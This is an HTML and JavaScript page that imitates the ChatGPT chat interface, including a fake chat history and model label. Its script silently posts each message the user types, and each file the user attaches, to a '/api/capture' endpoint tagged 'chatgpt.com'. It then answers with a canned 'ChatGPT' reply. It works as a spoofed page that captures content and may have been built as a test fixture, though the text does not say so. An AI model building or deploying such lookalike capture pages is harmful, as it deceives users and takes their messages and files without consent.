<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ChatGPT</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background-color: #343541;
            color: #ececf1;
            display: flex;
            height: 100vh;
            overflow: hidden;
        }

        /* Sidebar */
        .sidebar {
            width: 260px;
            background: #202123;
            display: flex;
            flex-direction: column;
            padding: 8px;
            flex-shrink: 0;
        }
        .new-chat-btn {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 12px;
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 6px;
            color: #fff;
            background: transparent;
            cursor: pointer;
            font-size: 14px;
            margin-bottom: 8px;
            transition: background 0.15s;
        }
        .new-chat-btn:hover { background: rgba(255,255,255,0.1); }
        .new-chat-btn svg { width: 16px; height: 16px; }
        .chat-history { flex: 1; overflow-y: auto; }
        .chat-history-item {
            padding: 10px 12px;
            border-radius: 6px;
            font-size: 13px;
            color: #c5c5d2;
            cursor: pointer;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            margin-bottom: 2px;
        }
        .chat-history-item:hover { background: rgba(255,255,255,0.08); }
        .chat-history-item.active { background: rgba(255,255,255,0.12); }

        /* Main area */
        .main {
            flex: 1;
            display: flex;
            flex-direction: column;
            position: relative;
        }
        .header {
            padding: 12px 20px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
            font-size: 14px;
            font-weight: 600;
            color: #c5c5d2;
        }
        .chat-area {
            flex: 1;
            overflow-y: auto;
            padding: 20px 0;
        }
        .message-row {
            padding: 16px 40px;
            max-width: 800px;
            margin: 0 auto;
            width: 100%;
        }
        .message-row.assistant { background: #444654; }
        .message-row.user { background: transparent; }
        .message-label {
            font-weight: 700;
            font-size: 14px;
            margin-bottom: 6px;
        }
        .message-label.user-label { color: #ececf1; }
        .message-label.assistant-label { color: #10a37f; }
        .message-text {
            font-size: 15px;
            line-height: 1.6;
            white-space: pre-wrap;
            word-break: break-word;
        }

        /* Welcome */
        .welcome {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px;
        }
        .welcome h1 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 8px;
        }
        .welcome p {
            color: #8e8ea0;
            font-size: 16px;
        }

        /* Input area */
        .input-area {
            padding: 16px 40px 24px;
            max-width: 800px;
            margin: 0 auto;
            width: 100%;
        }
        .input-wrapper {
            display: flex;
            align-items: flex-end;
            background: #40414f;
            border: 1px solid rgba(255,255,255,0.15);
            border-radius: 12px;
            padding: 8px 12px;
            gap: 8px;
            transition: border-color 0.2s;
        }
        .input-wrapper:focus-within { border-color: #10a37f; }
        .attach-btn {
            background: none;
            border: none;
            color: #8e8ea0;
            cursor: pointer;
            padding: 6px;
            border-radius: 6px;
            display: flex;
            align-items: center;
            flex-shrink: 0;
        }
        .attach-btn:hover { color: #ececf1; background: rgba(255,255,255,0.1); }
        .attach-btn svg { width: 20px; height: 20px; }
        #message-input {
            flex: 1;
            background: transparent;
            border: none;
            color: #ececf1;
            font-size: 15px;
            line-height: 1.5;
            resize: none;
            outline: none;
            min-height: 24px;
            max-height: 200px;
            font-family: inherit;
        }
        #message-input::placeholder { color: #8e8ea0; }
        .send-btn {
            background: #10a37f;
            border: none;
            color: #fff;
            width: 32px;
            height: 32px;
            border-radius: 6px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            transition: background 0.15s;
        }
        .send-btn:hover { background: #0d8c6d; }
        .send-btn:disabled { background: #555; cursor: not-allowed; }
        .send-btn svg { width: 16px; height: 16px; }

        .file-input { display: none; }
        .toast {
            position: fixed;
            bottom: 100px;
            left: 50%;
            transform: translateX(-50%);
            background: #10a37f;
            color: #fff;
            padding: 8px 20px;
            border-radius: 8px;
            font-size: 14px;
            opacity: 0;
            transition: opacity 0.3s;
            pointer-events: none;
            z-index: 999;
        }
        .toast.show { opacity: 1; }
    </style>
</head>
<body>
    <div class="sidebar">
        <button class="new-chat-btn" onclick="resetChat()">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <line x1="12" y1="5" x2="12" y2="19"></line>
                <line x1="5" y1="12" x2="19" y2="12"></line>
            </svg>
            New chat
        </button>
        <div class="chat-history">
            <div class="chat-history-item active">Summarize quarterly report</div>
            <div class="chat-history-item">Python script for data analysis</div>
            <div class="chat-history-item">Draft email to team</div>
            <div class="chat-history-item">Meeting notes template</div>
            <div class="chat-history-item">Review security policy</div>
        </div>
    </div>

    <div class="main">
        <div class="header">ChatGPT <span style="font-weight:400;color:#8e8ea0">4o</span></div>
        <div class="chat-area" id="chat-area">
            <div class="welcome" id="welcome">
                <h1>How can I help you today?</h1>
                <p>Send a message to start a conversation.</p>
            </div>
        </div>
        <div class="input-area">
            <div class="input-wrapper">
                <button class="attach-btn" onclick="document.getElementById('file-input').click()" title="Attach file">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M21.44 11.05l-9.19 9.19a6 6 0 01-8.49-8.49l9.19-9.19a4 4 0 015.66 5.66l-9.2 9.19a2 2 0 01-2.83-2.83l8.49-8.48"/>
                    </svg>
                </button>
                <input type="file" id="file-input" class="file-input" onchange="handleFileUpload(this)">
                <textarea id="message-input" rows="1" placeholder="Message ChatGPT..." onkeydown="handleKeyDown(event)" oninput="autoResize(this)"></textarea>
                <button class="send-btn" id="send-btn" onclick="sendMessage()" title="Send message">
                    <svg viewBox="0 0 24 24" fill="currentColor">
                        <path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/>
                    </svg>
                </button>
            </div>
        </div>
    </div>

    <div class="toast" id="toast"></div>

    <script>
        var chatArea = document.getElementById('chat-area');
        var messageInput = document.getElementById('message-input');
        var welcome = document.getElementById('welcome');
        var hasMessages = false;

        function autoResize(el) {
            el.style.height = 'auto';
            el.style.height = Math.min(el.scrollHeight, 200) + 'px';
        }

        function handleKeyDown(e) {
            if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                sendMessage();
            }
        }

        function showToast(text) {
            var t = document.getElementById('toast');
            t.textContent = text;
            t.classList.add('show');
            setTimeout(function() { t.classList.remove('show'); }, 2000);
        }

        function addMessage(role, text) {
            if (!hasMessages && welcome) {
                welcome.remove();
                hasMessages = true;
            }
            var row = document.createElement('div');
            row.className = 'message-row ' + role;
            var label = document.createElement('div');
            label.className = 'message-label ' + (role === 'user' ? 'user-label' : 'assistant-label');
            label.textContent = role === 'user' ? 'You' : 'ChatGPT';
            var msgText = document.createElement('div');
            msgText.className = 'message-text';
            msgText.textContent = text;
            row.appendChild(label);
            row.appendChild(msgText);
            chatArea.appendChild(row);
            chatArea.scrollTop = chatArea.scrollHeight;
        }

        function sendMessage() {
            var text = messageInput.value.trim();
            if (!text) return;

            addMessage('user', text);
            messageInput.value = '';
            messageInput.style.height = 'auto';

            fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    site: 'chatgpt.com',
                    action: 'send_message',
                    content: text
                })
            })
            .then(function(r) { return r.json(); })
            .then(function() {
                showToast('Sent');
                setTimeout(function() {
                    addMessage('assistant', 'I received your message. How else can I help?');
                }, 600);
            })
            .catch(function(err) {
                console.error('Send failed:', err);
            });
        }

        function handleFileUpload(input) {
            if (!input.files || !input.files[0]) return;
            var file = input.files[0];

            var formData = new FormData();
            formData.append('file', file);
            formData.append('site', 'chatgpt.com');
            formData.append('action', 'upload_file');

            addMessage('user', '[Uploaded file: ' + file.name + ']');

            fetch('/api/capture', {
                method: 'POST',
                body: formData
            })
            .then(function(r) { return r.json(); })
            .then(function() {
                showToast('File uploaded');
                setTimeout(function() {
                    addMessage('assistant', 'I\'ve received the file "' + file.name + '". What would you like me to do with it?');
                }, 600);
            })
            .catch(function(err) {
                console.error('Upload failed:', err);
            });

            input.value = '';
        }

        function resetChat() {
            chatArea.innerHTML = '<div class="welcome" id="welcome"><h1>How can I help you today?</h1><p>Send a message to start a conversation.</p></div>';
            welcome = document.getElementById('welcome');
            hasMessages = false;
            messageInput.value = '';
        }
    </script>
</body>
</html>
